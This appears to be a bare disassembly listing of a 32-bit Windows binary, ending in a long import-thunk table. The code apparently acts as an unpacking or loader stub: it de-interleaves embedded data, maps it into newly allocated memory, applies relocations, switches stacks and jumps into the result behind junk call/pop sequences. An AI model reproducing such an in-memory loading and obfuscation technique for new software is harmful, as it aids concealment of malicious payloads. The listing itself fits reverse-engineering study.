  41b480:	push   eax
  41b481:	call   DWORD PTR [ebp-0x48c]
  41b487:	test   eax,eax
  41b489:	je     0x41b492
  41b48b:	xor    eax,eax
  41b48d:	jmp    0x41b798
  41b492:	lea    ecx,[ebp-0x468]
  41b498:	push   ecx
  41b499:	push   0x20019
  41b49e:	push   0x0
  41b4a0:	push   0x41d10c
  41b4a5:	mov    edx,DWORD PTR [ebp-0x468]
  41b4ab:	push   edx
  41b4ac:	call   DWORD PTR [ebp-0x48c]
  41b4b2:	test   eax,eax
  41b4b4:	jne    0x41b4bd
  41b4b6:	xor    eax,eax
  41b4b8:	jmp    0x41b798
  41b4bd:	mov    DWORD PTR [ebp-0x424],0x0
  41b4c7:	mov    DWORD PTR [ebp-0x498],0x64
  41b4d1:	mov    DWORD PTR [ebp-0x42c],0x12
  41b4db:	mov    DWORD PTR [ebp-0x4a4],0x0
  41b4e5:	mov    DWORD PTR [ebp-0x464],0x0
  41b4ef:	mov    DWORD PTR [ebp-0x494],0x1
  41b4f9:	mov    DWORD PTR [ebp-0x4b8],0x3
  41b503:	call   0x41b120
  41b508:	mov    eax,ds:0x420f60
  41b50d:	push   eax
  41b50e:	call   0x41b180
  41b513:	add    esp,0x4
  41b516:	mov    DWORD PTR [ebp-0x4a8],eax
  41b51c:	mov    ecx,DWORD PTR [ebp-0x4a8]
  41b522:	push   ecx
  41b523:	call   0x41b0a0
  41b528:	add    esp,0x4
  41b52b:	mov    DWORD PTR [ebp-0x4a0],eax
  41b531:	mov    edx,DWORD PTR [ebp-0x4a8]
  41b537:	push   edx
  41b538:	push   0x0
  41b53a:	mov    eax,DWORD PTR [ebp-0x4a0]
  41b540:	push   eax
  41b541:	call   0x41b0e0
  41b546:	add    esp,0xc
  41b549:	mov    ecx,DWORD PTR [ebp-0x4a8]
  41b54f:	mov    DWORD PTR [ebp-0x4b0],ecx
  41b555:	mov    edx,DWORD PTR [ebp-0x4a4]
  41b55b:	cmp    edx,DWORD PTR [ebp-0x4a8]
  41b561:	jae    0x41b5ec
  41b567:	mov    eax,DWORD PTR [ebp-0x4b0]
  41b56d:	push   eax
  41b56e:	mov    ecx,DWORD PTR [ebp-0x498]
  41b574:	push   ecx
  41b575:	call   0x41b0f0
  41b57a:	add    esp,0x8
  41b57d:	mov    DWORD PTR [ebp-0x4b4],eax
  41b583:	mov    edx,DWORD PTR [ebp-0x4b4]
  41b589:	push   edx
  41b58a:	mov    eax,ds:0x420f60
  41b58f:	add    eax,DWORD PTR [ebp-0x464]
  41b595:	push   eax
  41b596:	mov    ecx,DWORD PTR [ebp-0x4a0]
  41b59c:	add    ecx,DWORD PTR [ebp-0x4a4]
  41b5a2:	push   ecx
  41b5a3:	call   0x41c0e4
  41b5a8:	add    esp,0xc
  41b5ab:	mov    edx,DWORD PTR [ebp-0x42c]
  41b5b1:	add    edx,DWORD PTR [ebp-0x498]
  41b5b7:	add    edx,DWORD PTR [ebp-0x464]
  41b5bd:	mov    DWORD PTR [ebp-0x464],edx
  41b5c3:	mov    eax,DWORD PTR [ebp-0x4a4]
  41b5c9:	add    eax,DWORD PTR [ebp-0x498]
  41b5cf:	mov    DWORD PTR [ebp-0x4a4],eax
  41b5d5:	mov    ecx,DWORD PTR [ebp-0x4b0]
  41b5db:	sub    ecx,DWORD PTR [ebp-0x4b4]
  41b5e1:	mov    DWORD PTR [ebp-0x4b0],ecx
  41b5e7:	jmp    0x41b555
  41b5ec:	mov    edx,DWORD PTR [ebp-0x4a8]
  41b5f2:	push   edx
  41b5f3:	mov    eax,DWORD PTR [ebp-0x4a0]
  41b5f9:	push   eax
  41b5fa:	call   0x41b210
  41b5ff:	add    esp,0x8
  41b602:	mov    DWORD PTR [ebp-0x464],0x0
  41b60c:	mov    DWORD PTR [ebp-0x4c8],0x0
  41b616:	call   0x41b170
  41b61b:	mov    ecx,DWORD PTR ds:0x420f60
  41b621:	push   ecx
  41b622:	call   0x41b180
  41b627:	add    esp,0x4
  41b62a:	mov    DWORD PTR [ebp-0x4cc],eax
  41b630:	mov    edx,DWORD PTR [ebp-0x4cc]
  41b636:	push   edx
  41b637:	call   0x41b0a0
  41b63c:	add    esp,0x4
  41b63f:	mov    DWORD PTR [ebp-0x460],eax
  41b645:	mov    eax,DWORD PTR [ebp-0x4cc]
  41b64b:	push   eax
  41b64c:	push   0x0
  41b64e:	mov    ecx,DWORD PTR [ebp-0x460]
  41b654:	push   ecx
  41b655:	call   0x41b0e0
  41b65a:	add    esp,0xc
  41b65d:	mov    edx,DWORD PTR [ebp-0x4cc]
  41b663:	mov    DWORD PTR [ebp-0x4d4],edx
  41b669:	mov    eax,DWORD PTR [ebp-0x4c8]
  41b66f:	cmp    eax,DWORD PTR [ebp-0x4cc]
  41b675:	jae    0x41b701
  41b67b:	mov    ecx,DWORD PTR [ebp-0x4d4]
  41b681:	push   ecx
  41b682:	mov    edx,DWORD PTR [ebp-0x498]
  41b688:	push   edx
  41b689:	call   0x41b0f0
  41b68e:	add    esp,0x8
  41b691:	mov    DWORD PTR [ebp-0x4d8],eax
  41b697:	mov    eax,DWORD PTR [ebp-0x4d8]
  41b69d:	push   eax
  41b69e:	mov    ecx,DWORD PTR ds:0x420f60
  41b6a4:	add    ecx,DWORD PTR [ebp-0x464]
  41b6aa:	push   ecx
  41b6ab:	mov    edx,DWORD PTR [ebp-0x460]
  41b6b1:	add    edx,DWORD PTR [ebp-0x4c8]
  41b6b7:	push   edx
  41b6b8:	call   0x41c0e4
  41b6bd:	add    esp,0xc
  41b6c0:	mov    eax,DWORD PTR [ebp-0x42c]
  41b6c6:	add    eax,DWORD PTR [ebp-0x498]
  41b6cc:	add    eax,DWORD PTR [ebp-0x464]
  41b6d2:	mov    DWORD PTR [ebp-0x464],eax
  41b6d8:	mov    ecx,DWORD PTR [ebp-0x4c8]
  41b6de:	add    ecx,DWORD PTR [ebp-0x498]
  41b6e4:	mov    DWORD PTR [ebp-0x4c8],ecx
  41b6ea:	mov    edx,DWORD PTR [ebp-0x4d4]
  41b6f0:	sub    edx,DWORD PTR [ebp-0x4d8]
  41b6f6:	mov    DWORD PTR [ebp-0x4d4],edx
  41b6fc:	jmp    0x41b669
  41b701:	mov    eax,DWORD PTR [ebp-0x4cc]
  41b707:	push   eax
  41b708:	mov    ecx,DWORD PTR [ebp-0x460]
  41b70e:	push   ecx
  41b70f:	call   0x41b210
  41b714:	add    esp,0x8
  41b717:	mov    edx,DWORD PTR [ebp-0x4a0]
  41b71d:	mov    eax,DWORD PTR [ebp-0x460]
  41b723:	mov    DWORD PTR [edx],eax
  41b725:	push   0x17000
  41b72a:	call   0x41b0a0
  41b72f:	add    esp,0x4
  41b732:	mov    DWORD PTR [ebp-0xc],eax
  41b735:	push   0x15500
  41b73a:	mov    ecx,DWORD PTR [ebp-0x4a0]
  41b740:	push   ecx
  41b741:	mov    edx,DWORD PTR [ebp-0xc]
  41b744:	add    edx,0x200
  41b74a:	push   edx
  41b74b:	call   0x41c0e4
  41b750:	add    esp,0xc
  41b753:	mov    eax,DWORD PTR [ebp-0xc]
  41b756:	sub    eax,0x400000
  41b75b:	push   eax
  41b75c:	mov    ecx,DWORD PTR [ebp-0xc]
  41b75f:	push   ecx
  41b760:	mov    edx,DWORD PTR [ebp-0x460]
  41b766:	push   edx
  41b767:	call   0x41b2f0
  41b76c:	add    esp,0xc
  41b76f:	mov    esp,DWORD PTR ds:0x420f68
  41b775:	pop    eax
  41b776:	mov    eax,DWORD PTR [ebp-0xc]
  41b779:	add    eax,0x15350
  41b77e:	call   0x41b783
  41b783:	pop    ecx
  41b784:	call   0x41b789
  41b789:	pop    ecx
  41b78a:	call   0x41b78f
  41b78f:	pop    ecx
  41b790:	call   0x41b795
  41b795:	pop    ecx
  41b796:	jmp    eax
  41b798:	mov    esp,ebp
  41b79a:	pop    ebp
  41b79b:	ret    
  41b79c:	jmp    DWORD PTR ds:0x41daac
  41b7a2:	jmp    DWORD PTR ds:0x41dab0
  41b7a8:	jmp    DWORD PTR ds:0x41dab4
  41b7ae:	jmp    DWORD PTR ds:0x41dab8
  41b7b4:	jmp    DWORD PTR ds:0x41dabc
  41b7ba:	jmp    DWORD PTR ds:0x41dac0
  41b7c0:	jmp    DWORD PTR ds:0x41dac4
  41b7c6:	jmp    DWORD PTR ds:0x41dac8
  41b7cc:	jmp    DWORD PTR ds:0x41dacc
  41b7d2:	jmp    DWORD PTR ds:0x41dad0
  41b7d8:	jmp    DWORD PTR ds:0x41dad4
  41b7de:	jmp    DWORD PTR ds:0x41dad8
  41b7e4:	jmp    DWORD PTR ds:0x41dadc
  41b7ea:	jmp    DWORD PTR ds:0x41dae0
  41b7f0:	jmp    DWORD PTR ds:0x41dae4
  41b7f6:	jmp    DWORD PTR ds:0x41dae8
  41b7fc:	jmp    DWORD PTR ds:0x41daec
  41b802:	jmp    DWORD PTR ds:0x41daf0
  41b808:	jmp    DWORD PTR ds:0x41daf4
  41b80e:	jmp    DWORD PTR ds:0x41daf8
  41b814:	jmp    DWORD PTR ds:0x41dafc
  41b81a:	jmp    DWORD PTR ds:0x41db00
  41b820:	jmp    DWORD PTR ds:0x41db04
  41b826:	jmp    DWORD PTR ds:0x41db08
  41b82c:	jmp    DWORD PTR ds:0x41db0c
  41b832:	jmp    DWORD PTR ds:0x41db10
  41b838:	jmp    DWORD PTR ds:0x41db14
  41b83e:	jmp    DWORD PTR ds:0x41db18
  41b844:	jmp    DWORD PTR ds:0x41db1c
  41b84a:	jmp    DWORD PTR ds:0x41db20
  41b850:	jmp    DWORD PTR ds:0x41db24
  41b856:	jmp    DWORD PTR ds:0x41db28
  41b85c:	jmp    DWORD PTR ds:0x41db2c
  41b862:	jmp    DWORD PTR ds:0x41db30
  41b868:	jmp    DWORD PTR ds:0x41db34
  41b86e:	jmp    DWORD PTR ds:0x41db38
  41b874:	jmp    DWORD PTR ds:0x41db3c
  41b87a:	jmp    DWORD PTR ds:0x41db40
  41b880:	jmp    DWORD PTR ds:0x41db44
  41b886:	jmp    DWORD PTR ds:0x41db48
  41b88c:	jmp    DWORD PTR ds:0x41db4c
  41b892:	jmp    DWORD PTR ds:0x41db50
  41b898:	jmp    DWORD PTR ds:0x41db54
  41b89e:	jmp    DWORD PTR ds:0x41db58
  41b8a4:	jmp    DWORD PTR ds:0x41db5c
  41b8aa:	jmp    DWORD PTR ds:0x41db60
  41b8b0:	jmp    DWORD PTR ds:0x41db64
  41b8b6:	jmp    DWORD PTR ds:0x41db68
  41b8bc:	jmp    DWORD PTR ds:0x41db6c
  41b8c2:	jmp    DWORD PTR ds:0x41db70
  41b8c8:	jmp    DWORD PTR ds:0x41db74
  41b8ce:	jmp    DWORD PTR ds:0x41db78
  41b8d4:	jmp    DWORD PTR ds:0x41db7c
  41b8da:	jmp    DWORD PTR ds:0x41db80
  41b8e0:	jmp    DWORD PTR ds:0x41db84
  41b8e6:	jmp    DWORD PTR ds:0x41db88
  41b8ec:	jmp    DWORD PTR ds:0x41db8c
  41b8f2:	jmp    DWORD PTR ds:0x41db90
  41b8f8:	jmp    DWORD PTR ds:0x41db94
  41b8fe:	jmp    DWORD PTR ds:0x41db98
  41b904:	jmp    DWORD PTR ds:0x41db9c
  41b90a:	jmp    DWORD PTR ds:0x41dba0
  41b910:	jmp    DWORD PTR ds:0x41dba4
  41b916:	jmp    DWORD PTR ds:0x41dba8
  41b91c:	jmp    DWORD PTR ds:0x41dbac
  41b922:	jmp    DWORD PTR ds:0x41dbb0
  41b928:	jmp    DWORD PTR ds:0x41dbb4
  41b92e:	jmp    DWORD PTR ds:0x41dbb8
  41b934:	jmp    DWORD PTR ds:0x41dbbc
  41b93a:	jmp    DWORD PTR ds:0x41dbc0
  41b940:	jmp    DWORD PTR ds:0x41dbc4
  41b946:	jmp    DWORD PTR ds:0x41dbc8
  41b94c:	jmp    DWORD PTR ds:0x41dbcc
  41b952:	jmp    DWORD PTR ds:0x41dbd0
  41b958:	jmp    DWORD PTR ds:0x41dbd4
  41b95e:	jmp    DWORD PTR ds:0x41dbd8
  41b964:	jmp    DWORD PTR ds:0x41dbdc
  41b96a:	jmp    DWORD PTR ds:0x41dbe0
  41b970:	jmp    DWORD PTR ds:0x41dbe4
  41b976:	jmp    DWORD PTR ds:0x41dbe8
  41b97c:	jmp    DWORD PTR ds:0x41dbec
  41b982:	jmp    DWORD PTR ds:0x41dbf0
  41b988:	jmp    DWORD PTR ds:0x41dbf4
  41b98e:	jmp    DWORD PTR ds:0x41dbf8
  41b994:	jmp    DWORD PTR ds:0x41dbfc
  41b99a:	jmp    DWORD PTR ds:0x41dc00
  41b9a0:	jmp    DWORD PTR ds:0x41dc04
  41b9a6:	jmp    DWORD PTR ds:0x41dc08
  41b9ac:	jmp    DWORD PTR ds:0x41dc0c
  41b9b2:	jmp    DWORD PTR ds:0x41dc10
  41b9b8:	jmp    DWORD PTR ds:0x41dc14
  41b9be:	jmp    DWORD PTR ds:0x41dc18
  41b9c4:	jmp    DWORD PTR ds:0x41dc1c
  41b9ca:	jmp    DWORD PTR ds:0x41dc20
  41b9d0:	jmp    DWORD PTR ds:0x41dc24
  41b9d6:	jmp    DWORD PTR ds:0x41dc28
  41b9dc:	jmp    DWORD PTR ds:0x41dc2c
  41b9e2:	jmp    DWORD PTR ds:0x41dc30
  41b9e8:	jmp    DWORD PTR ds:0x41dc34
  41b9ee:	jmp    DWORD PTR ds:0x41dc38
  41b9f4:	jmp    DWORD PTR ds:0x41dc3c
  41b9fa:	jmp    DWORD PTR ds:0x41dc40
  41ba00:	jmp    DWORD PTR ds:0x41dc44
  41ba06:	jmp    DWORD PTR ds:0x41dc48
  41ba0c:	jmp    DWORD PTR ds:0x41dc4c
  41ba12:	jmp    DWORD PTR ds:0x41dc50
  41ba18:	jmp    DWORD PTR ds:0x41dc54
  41ba1e:	jmp    DWORD PTR ds:0x41dc58
  41ba24:	jmp    DWORD PTR ds:0x41dc5c
  41ba2a:	jmp    DWORD PTR ds:0x41dc60
  41ba30:	jmp    DWORD PTR ds:0x41dc64
  41ba36:	jmp    DWORD PTR ds:0x41dc68
  41ba3c:	jmp    DWORD PTR ds:0x41dc6c
  41ba42:	jmp    DWORD PTR ds:0x41dc70
  41ba48:	jmp    DWORD PTR ds:0x41dc74
  41ba4e:	jmp    DWORD PTR ds:0x41dc78
  41ba54:	jmp    DWORD PTR ds:0x41dc7c
  41ba5a:	jmp    DWORD PTR ds:0x41dc80
  41ba60:	jmp    DWORD PTR ds:0x41dc84
  41ba66:	jmp    DWORD PTR ds:0x41dc88
  41ba6c:	jmp    DWORD PTR ds:0x41dc8c
  41ba72:	jmp    DWORD PTR ds:0x41dc90
  41ba78:	jmp    DWORD PTR ds:0x41dc94
  41ba7e:	jmp    DWORD PTR ds:0x41dc98
  41ba84:	jmp    DWORD PTR ds:0x41dc9c
  41ba8a:	jmp    DWORD PTR ds:0x41dca0
  41ba90:	jmp    DWORD PTR ds:0x41dca4
  41ba96:	jmp    DWORD PTR ds:0x41dca8
  41ba9c:	jmp    DWORD PTR ds:0x41dcac
  41baa2:	jmp    DWORD PTR ds:0x41dcb0
  41baa8:	jmp    DWORD PTR ds:0x41dcb4
  41baae:	jmp    DWORD PTR ds:0x41dcb8
  41bab4:	jmp    DWORD PTR ds:0x41dcbc
  41baba:	jmp    DWORD PTR ds:0x41dcc0
  41bac0:	jmp    DWORD PTR ds:0x41dcc4
  41bac6:	jmp    DWORD PTR ds:0x41dcc8
  41bacc:	jmp    DWORD PTR ds:0x41dccc
  41bad2:	jmp    DWORD PTR ds:0x41dcd0
  41bad8:	jmp    DWORD PTR ds:0x41dcd4
  41bade:	jmp    DWORD PTR ds:0x41dcd8
  41bae4:	jmp    DWORD PTR ds:0x41dcdc
  41baea:	jmp    DWORD PTR ds:0x41dce0
  41baf0:	jmp    DWORD PTR ds:0x41dce4
  41baf6:	jmp    DWORD PTR ds:0x41dce8
  41bafc:	jmp    DWORD PTR ds:0x41dcec
  41bb02:	jmp    DWORD PTR ds:0x41dcf0
  41bb08:	jmp    DWORD PTR ds:0x41dcf4
  41bb0e:	jmp    DWORD PTR ds:0x41dcf8
  41bb14:	jmp    DWORD PTR ds:0x41dcfc
  41bb1a:	jmp    DWORD PTR ds:0x41dd00
  41bb20:	jmp    DWORD PTR ds:0x41dd08
  41bb26:	jmp    DWORD PTR ds:0x41dd0c
  41bb2c:	jmp    DWORD PTR ds:0x41dd10
  41bb32:	jmp    DWORD PTR ds:0x41dd14
  41bb38:	jmp    DWORD PTR ds:0x41dd18
  41bb3e:	jmp    DWORD PTR ds:0x41dd1c
  41bb44:	jmp    DWORD PTR ds:0x41dd20
  41bb4a:	jmp    DWORD PTR ds:0x41dd24
  41bb50:	jmp    DWORD PTR ds:0x41dd28
  41bb56:	jmp    DWORD PTR ds:0x41dd2c
  41bb5c:	jmp    DWORD PTR ds:0x41dd30
  41bb62:	jmp    DWORD PTR ds:0x41dd34
  41bb68:	jmp    DWORD PTR ds:0x41dd38
  41bb6e:	jmp    DWORD PTR ds:0x41dd3c
  41bb74:	jmp    DWORD PTR ds:0x41dd40
  41bb7a:	jmp    DWORD PTR ds:0x41dd44
  41bb80:	jmp    DWORD PTR ds:0x41dd48
  41bb86:	jmp    DWORD PTR ds:0x41dd4c
  41bb8c:	jmp    DWORD PTR ds:0x41dd50
  41bb92:	jmp    DWORD PTR ds:0x41dd54
  41bb98:	jmp    DWORD PTR ds:0x41dd58
  41bb9e:	jmp    DWORD PTR ds:0x41dd5c
  41bba4:	jmp    DWORD PTR ds:0x41dd60
  41bbaa:	jmp    DWORD PTR ds:0x41dd64
  41bbb0:	jmp    DWORD PTR ds:0x41dd68
  41bbb6:	jmp    DWORD PTR ds:0x41dd6c
  41bbbc:	jmp    DWORD PTR ds:0x41dd70
  41bbc2:	jmp    DWORD PTR ds:0x41dd74
  41bbc8:	jmp    DWORD PTR ds:0x41dd78
  41bbce:	jmp    DWORD PTR ds:0x41dd7c
  41bbd4:	jmp    DWORD PTR ds:0x41dd80
  41bbda:	jmp    DWORD PTR ds:0x41dd84
  41bbe0:	jmp    DWORD PTR ds:0x41dd88
  41bbe6:	jmp    DWORD PTR ds:0x41dd8c
  41bbec:	jmp    DWORD PTR ds:0x41dd90
  41bbf2:	jmp    DWORD PTR ds:0x41dd94
  41bbf8:	jmp    DWORD PTR ds:0x41dd98
  41bbfe:	jmp    DWORD PTR ds:0x41dd9c
  41bc04:	jmp    DWORD PTR ds:0x41dda0
  41bc0a:	jmp    DWORD PTR ds:0x41dda4
  41bc10:	jmp    DWORD PTR ds:0x41dda8
  41bc16:	jmp    DWORD PTR ds:0x41ddac
  41bc1c:	jmp    DWORD PTR ds:0x41ddb0
  41bc22:	jmp    DWORD PTR ds:0x41ddb4
  41bc28:	jmp    DWORD PTR ds:0x41ddb8
  41bc2e:	jmp    DWORD PTR ds:0x41ddbc
  41bc34:	jmp    DWORD PTR ds:0x41ddc0
  41bc3a:	jmp    DWORD PTR ds:0x41ddc4
  41bc40:	jmp    DWORD PTR ds:0x41ddc8
  41bc46:	jmp    DWORD PTR ds:0x41ddcc
  41bc4c:	jmp    DWORD PTR ds:0x41ddd0
  41bc52:	jmp    DWORD PTR ds:0x41ddd4
  41bc58:	jmp    DWORD PTR ds:0x41ddd8
  41bc5e:	jmp    DWORD PTR ds:0x41dddc
  41bc64:	jmp    DWORD PTR ds:0x41dde0
  41bc6a:	jmp    DWORD PTR ds:0x41dde4
  41bc70:	jmp    DWORD PTR ds:0x41dde8
  41bc76:	jmp    DWORD PTR ds:0x41ddec
  41bc7c:	jmp    DWORD PTR ds:0x41ddf0
  41bc82:	jmp    DWORD PTR ds:0x41ddf4
  41bc88:	jmp    DWORD PTR ds:0x41ddf8
  41bc8e:	jmp    DWORD PTR ds:0x41ddfc
  41bc94:	jmp    DWORD PTR ds:0x41de00
  41bc9a:	jmp    DWORD PTR ds:0x41de04
  41bca0:	jmp    DWORD PTR ds:0x41de08
  41bca6:	jmp    DWORD PTR ds:0x41de0c
  41bcac:	jmp    DWORD PTR ds:0x41de10
  41bcb2:	jmp    DWORD PTR ds:0x41de14
  41bcb8:	jmp    DWORD PTR ds:0x41de18
  41bcbe:	jmp    DWORD PTR ds:0x41de1c
  41bcc4:	jmp    DWORD PTR ds:0x41de20
  41bcca:	jmp    DWORD PTR ds:0x41de24
  41bcd0:	jmp    DWORD PTR ds:0x41de28
  41bcd6:	jmp    DWORD PTR ds:0x41de2c
  41bcdc:	jmp    DWORD PTR ds:0x41de30
  41bce2:	jmp    DWORD PTR ds:0x41de34
  41bce8:	jmp    DWORD PTR ds:0x41de38
  41bcee:	jmp    DWORD PTR ds:0x41de3c
  41bcf4:	jmp    DWORD PTR ds:0x41de40
  41bcfa:	jmp    DWORD PTR ds:0x41de44
  41bd00:	jmp    DWORD PTR ds:0x41de48
  41bd06:	jmp    DWORD PTR ds:0x41de4c
  41bd0c:	jmp    DWORD PTR ds:0x41de50
  41bd12:	jmp    DWORD PTR ds:0x41de54
  41bd18:	jmp    DWORD PTR ds:0x41de58
  41bd1e:	jmp    DWORD PTR ds:0x41de5c
  41bd24:	jmp    DWORD PTR ds:0x41de60
  41bd2a:	jmp    DWORD PTR ds:0x41de64
  41bd30:	jmp    DWORD PTR ds:0x41de68
  41bd36:	jmp    DWORD PTR ds:0x41de6c
  41bd3c:	jmp    DWORD PTR ds:0x41de70
  41bd42:	jmp    DWORD PTR ds:0x41de74
  41bd48:	jmp    DWORD PTR ds:0x41de78
  41bd4e:	jmp    DWORD PTR ds:0x41de7c
  41bd54:	jmp    DWORD PTR ds:0x41de80
  41bd5a:	jmp    DWORD PTR ds:0x41de84
  41bd60:	jmp    DWORD PTR ds:0x41de88
  41bd66:	jmp    DWORD PTR ds:0x41de8c
  41bd6c:	jmp    DWORD PTR ds:0x41de90
  41bd72:	jmp    DWORD PTR ds:0x41de94
  41bd78:	jmp    DWORD PTR ds:0x41de98
  41bd7e:	jmp    DWORD PTR ds:0x41de9c
  41bd84:	jmp    DWORD PTR ds:0x41dea0
  41bd8a:	jmp    DWORD PTR ds:0x41dea4
  41bd90:	jmp    DWORD PTR ds:0x41dea8
  41bd96:	jmp    DWORD PTR ds:0x41deac
  41bd9c:	jmp    DWORD PTR ds:0x41deb0
  41bda2:	jmp    DWORD PTR ds:0x41deb4
  41bda8:	jmp    DWORD PTR ds:0x41deb8
  41bdae:	jmp    DWORD PTR ds:0x41debc
  41bdb4:	jmp    DWORD PTR ds:0x41dec0
  41bdba:	jmp    DWORD PTR ds:0x41dec4
  41bdc0:	jmp    DWORD PTR ds:0x41dec8
  41bdc6:	jmp    DWORD PTR ds:0x41decc
  41bdcc:	jmp    DWORD PTR ds:0x41ded0
  41bdd2:	jmp    DWORD PTR ds:0x41ded4
  41bdd8:	jmp    DWORD PTR ds:0x41ded8
  41bdde:	jmp    DWORD PTR ds:0x41dedc
  41bde4:	jmp    DWORD PTR ds:0x41dee0
  41bdea:	jmp    DWORD PTR ds:0x41dee4
  41bdf0:	jmp    DWORD PTR ds:0x41dee8
  41bdf6:	jmp    DWORD PTR ds:0x41deec
  41bdfc:	jmp    DWORD PTR ds:0x41def0
  41be02:	jmp    DWORD PTR ds:0x41def4
  41be08:	jmp    DWORD PTR ds:0x41def8
  41be0e:	jmp    DWORD PTR ds:0x41defc
  41be14:	jmp    DWORD PTR ds:0x41df00
  41be1a:	jmp    DWORD PTR ds:0x41df04
  41be20:	jmp    DWORD PTR ds:0x41df08
  41be26:	jmp    DWORD PTR ds:0x41df0c
  41be2c:	jmp    DWORD PTR ds:0x41df10
  41be32:	jmp    DWORD PTR ds:0x41df14
  41be38:	jmp    DWORD PTR ds:0x41df18
  41be3e:	jmp    DWORD PTR ds:0x41df1c
  41be44:	jmp    DWORD PTR ds:0x41df20
  41be4a:	jmp    DWORD PTR ds:0x41df24
  41be50:	jmp    DWORD PTR ds:0x41df28
  41be56:	jmp    DWORD PTR ds:0x41df2c
  41be5c:	jmp    DWORD PTR ds:0x41df30
  41be62:	jmp    DWORD PTR ds:0x41df34
  41be68:	jmp    DWORD PTR ds:0x41df38
  41be6e:	jmp    DWORD PTR ds:0x41df3c
  41be74:	jmp    DWORD PTR ds:0x41df40
  41be7a:	jmp    DWORD PTR ds:0x41df44
  41be80:	jmp    DWORD PTR ds:0x41df48
  41be86:	jmp    DWORD PTR ds:0x41df4c
  41be8c:	jmp    DWORD PTR ds:0x41df50
  41be92:	jmp    DWORD PTR ds:0x41df54
  41be98:	jmp    DWORD PTR ds:0x41df58
  41be9e:	jmp    DWORD PTR ds:0x41df5c
  41bea4:	jmp    DWORD PTR ds:0x41df60
  41beaa:	jmp    DWORD PTR ds:0x41df64
  41beb0:	jmp    DWORD PTR ds:0x41df68
  41beb6:	jmp    DWORD PTR ds:0x41df6c
  41bebc:	jmp    DWORD PTR ds:0x41df70
  41bec2:	jmp    DWORD PTR ds:0x41df74
  41bec8:	jmp    DWORD PTR ds:0x41df78
  41bece:	jmp    DWORD PTR ds:0x41df7c
  41bed4:	jmp    DWORD PTR ds:0x41df80
  41beda:	jmp    DWORD PTR ds:0x41df84
  41bee0:	jmp    DWORD PTR ds:0x41df88
  41bee6:	jmp    DWORD PTR ds:0x41df8c
  41beec:	jmp    DWORD PTR ds:0x41df90
  41bef2:	jmp    DWORD PTR ds:0x41df94
  41bef8:	jmp    DWORD PTR ds:0x41df98
  41befe:	jmp    DWORD PTR ds:0x41df9c
  41bf04:	jmp    DWORD PTR ds:0x41dfa0
  41bf0a:	jmp    DWORD PTR ds:0x41dfa4
  41bf10:	jmp    DWORD PTR ds:0x41dfa8
  41bf16:	jmp    DWORD PTR ds:0x41dfac
  41bf1c:	jmp    DWORD PTR ds:0x41dfb0
  41bf22:	jmp    DWORD PTR ds:0x41dfb4
  41bf28:	jmp    DWORD PTR ds:0x41dfb8
  41bf2e:	jmp    DWORD PTR ds:0x41dfbc
  41bf34:	jmp    DWORD PTR ds:0x41dfc0
  41bf3a:	jmp    DWORD PTR ds:0x41dfc4
  41bf40:	jmp    DWORD PTR ds:0x41dfc8
  41bf46:	jmp    DWORD PTR ds:0x41dfcc
  41bf4c:	jmp    DWORD PTR ds:0x41dfd0
  41bf52:	jmp    DWORD PTR ds:0x41dfd4
  41bf58:	jmp    DWORD PTR ds:0x41dfd8
  41bf5e:	jmp    DWORD PTR ds:0x41dfdc
  41bf64:	jmp    DWORD PTR ds:0x41dfe0
  41bf6a:	jmp    DWORD PTR ds:0x41dfe4
  41bf70:	jmp    DWORD PTR ds:0x41dfe8
  41bf76:	jmp    DWORD PTR ds:0x41dfec
  41bf7c:	jmp    DWORD PTR ds:0x41dff0
  41bf82:	jmp    DWORD PTR ds:0x41dff4
  41bf88:	jmp    DWORD PTR ds:0x41dff8
  41bf8e:	jmp    DWORD PTR ds:0x41dffc
  41bf94:	jmp    DWORD PTR ds:0x41e000
  41bf9a:	jmp    DWORD PTR ds:0x41e004
  41bfa0:	jmp    DWORD PTR ds:0x41e008
  41bfa6:	jmp    DWORD PTR ds:0x41e00c
  41bfac:	jmp    DWORD PTR ds:0x41e010
  41bfb2:	jmp    DWORD PTR ds:0x41e014
  41bfb8:	jmp    DWORD PTR ds:0x41e018
  41bfbe:	jmp    DWORD PTR ds:0x41e01c
  41bfc4:	jmp    DWORD PTR ds:0x41e020
  41bfca:	jmp    DWORD PTR ds:0x41e024
  41bfd0:	jmp    DWORD PTR ds:0x41e028
  41bfd6:	jmp    DWORD PTR ds:0x41e02c
  41bfdc:	jmp    DWORD PTR ds:0x41e030
  41bfe2:	jmp    DWORD PTR ds:0x41e034
  41bfe8:	jmp    DWORD PTR ds:0x41e038
  41bfee:	jmp    DWORD PTR ds:0x41e03c
  41bff4:	jmp    DWORD PTR ds:0x41e040
  41bffa:	jmp    DWORD PTR ds:0x41e044
  41c000:	jmp    DWORD PTR ds:0x41e048
  41c006:	jmp    DWORD PTR ds:0x41e04c
  41c00c:	jmp    DWORD PTR ds:0x41e050
  41c012:	jmp    DWORD PTR ds:0x41e054
  41c018:	jmp    DWORD PTR ds:0x41e058
  41c01e:	jmp    DWORD PTR ds:0x41e05c
  41c024:	jmp    DWORD PTR ds:0x41e060
  41c02a:	jmp    DWORD PTR ds:0x41e064
  41c030:	jmp    DWORD PTR ds:0x41e068
  41c036:	jmp    DWORD PTR ds:0x41e06c
  41c03c:	jmp    DWORD PTR ds:0x41e070
  41c042:	jmp    DWORD PTR ds:0x41e074
  41c048:	jmp    DWORD PTR ds:0x41e078
  41c04e:	jmp    DWORD PTR ds:0x41e07c
  41c054:	jmp    DWORD PTR ds:0x41e080
  41c05a:	jmp    DWORD PTR ds:0x41e084
  41c060:	jmp    DWORD PTR ds:0x41e088
  41c066:	jmp    DWORD PTR ds:0x41e08c
  41c06c:	jmp    DWORD PTR ds:0x41e090
  41c072:	jmp    DWORD PTR ds:0x41e094
  41c078:	jmp    DWORD PTR ds:0x41e098
  41c07e:	jmp    DWORD PTR ds:0x41e09c
  41c084:	jmp    DWORD PTR ds:0x41e0a0
  41c08a:	jmp    DWORD PTR ds:0x41e0a4
  41c090:	jmp    DWORD PTR ds:0x41e0a8
  41c096:	jmp    DWORD PTR ds:0x41e0ac
  41c09c:	jmp    DWORD PTR ds:0x41e0b0
  41c0a2:	jmp    DWORD PTR ds:0x41e0b4
  41c0a8:	jmp    DWORD PTR ds:0x41e0b8
  41c0ae:	jmp    DWORD PTR ds:0x41e0bc
  41c0b4:	jmp    DWORD PTR ds:0x41e0c0
  41c0ba:	jmp    DWORD PTR ds:0x41e0c4
  41c0c0:	jmp    DWORD PTR ds:0x41e0c8
  41c0c6:	jmp    DWORD PTR ds:0x41e0cc
